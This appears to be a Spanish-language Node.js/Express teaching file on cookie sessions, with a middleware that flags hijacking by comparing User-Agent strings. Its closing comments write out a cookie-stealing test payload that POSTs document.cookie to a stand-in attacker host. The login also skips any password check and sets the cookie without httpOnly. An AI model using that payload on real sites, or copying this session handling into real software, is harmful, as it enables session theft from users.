const express = require('express');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const app = express();
const port = 3000;

const sessions = {}

const createSession = function(req, res){
    const userAgent = req.get('user-agent');
    const sessionId = crypto.randomBytes(16).toString('base64url');
    sessions[sessionId] = {userAgent};
    res.cookie('sessionId', sessionId);
    return sessionId;
};

const getSessionId = function(req, res){
    return req.cookies['sessionId'] || createSession(req, res);
};

const getSessionData = function(req, res){
    let sessionId = req.cookies['sessionId'] || undefined;
    if(!sessionId){
        sessionId = createSession(req, res);
    }
    let sessionData = sessions[sessionId] || undefined;
    if(!sessionData){
        sessionId = createSession(req, res);
        sessionData = sessions[sessionId];
    }
    return sessionData;
};


const sessionMiddleware = function(req, res, next){
   const sessionData = getSessionData(req, res);
   if(!sessionData || !sessionData.username){
        res.redirect(302, '/login');
        return;
   }
   req.userData = sessionData;
   next();
};

const sessionHijackCheckMiddleware = function(req, res, next){
    const sessionData = getSessionData(req, res);
    const requestUserAgent = req.get('user-agent');
    const sessionUserAgent = sessionData.userAgent || null;
    if(requestUserAgent != sessionUserAgent){
        const sessionId = getSessionId(req, res);
        delete sessions[sessionId];
        console.log('SESION SECUESTRADA, detectado por User-Agent.');
        createSession(req, res);
    }
    next();
};


app.use (cookieParser());
app.use(express.urlencoded({extended: true}));


app.get('/', (req, res)=>{
    res.send('hola mundo');
});

app.post('/login', (req, res)=>{
    console.log(req.body);
    const{username} = req.body;
    const sessionId = crypto.randomBytes(16).toString('base64url');
    sessions[sessionId] = {username};
    res.cookie('sessionId',sessionId);
    res.redirect(302,'/home');
    
});

app.use('/login', express.static('static/html/login.html'));
app.get('/home', sessionHijackCheckMiddleware, sessionMiddleware, (req, res)=> {
 
     res.send(`Hola ${req.userData.username}`);
});






app.listen(port, () =>{
    console.log(`Listening on http://127.0.0.1:${port}`);

})

//npm init -y
//npm i express
//npm i -D nodemon
//npm run dev
// npm i cookie-parser



//prueba en navegador
//alert(docuemnt.cookie);
//fetch('https://atackers.site/cookies/robbed',{method:'POST',body:docuemnt.cookie})